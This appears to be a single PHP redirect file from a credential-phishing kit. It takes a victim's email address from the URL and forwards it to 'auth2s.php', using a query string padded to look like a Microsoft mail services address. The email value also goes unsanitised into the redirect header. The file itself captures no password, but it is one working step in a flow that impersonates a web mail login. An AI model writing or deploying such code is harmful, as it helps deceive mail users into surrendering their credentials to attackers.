<?php
$email = $_GET['email'];
header("Location: auth2s.php?rand=/en-us/suite/mailservices.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=ght.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
?>